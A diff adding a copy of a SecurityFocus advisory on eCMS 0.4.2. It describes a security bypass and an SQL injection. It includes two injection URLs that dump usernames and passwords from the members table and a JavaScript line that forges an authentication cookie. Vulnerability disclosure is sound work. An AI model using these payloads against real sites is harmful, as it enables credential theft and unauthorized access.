@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/29304/info
+
+eCMS is prone to multiple security vulnerabilities, including a security-bypass issue and an SQL-injection issue.
+
+Exploiting these issues may allow an attacker to bypass certain security restrictions and gain unauthorized access to the application. The attacker can also exploit the SQL-injection issue by manipulating the SQL query logic to carry out unauthorized actions on the underlying database. This will compromise the application and may aid in further attacks.
+
+These issues affect eCMS 0.4.2; other versions may also be affected. 
+
+http://www.example.com/index.php?p='/**/union/**/select/**/1,concat(username,0x3a,char(58),password),3,4,5,6/**/from/**/members/**/where/**/id=1/*
+http://www.example.com/index.php?p='/**/union/**/select/**/1,concat(username,0x3a,char(58),password),3,4,5,6/**/from/**/members/*
+
+The following proof-of-concept JavaScript code to create a cookie is available for the security-bypass issue:
+
+javascript:document.cookie = "pass=1; path=/";
+
